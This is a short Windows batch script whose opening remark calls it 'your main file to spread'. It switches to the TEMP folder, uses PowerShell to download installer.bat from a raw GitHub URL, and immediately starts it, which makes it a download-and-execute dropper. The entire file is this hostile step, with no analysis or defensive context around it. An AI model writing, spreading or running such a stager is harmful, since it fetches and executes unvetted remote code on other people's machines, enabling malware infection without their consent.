REM - This is your main file to spread.

cd %TEMP%
Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/Rudyx77/my_powershell_script/main/installer.bat' -OutFile installer.bat"
start installer.bat
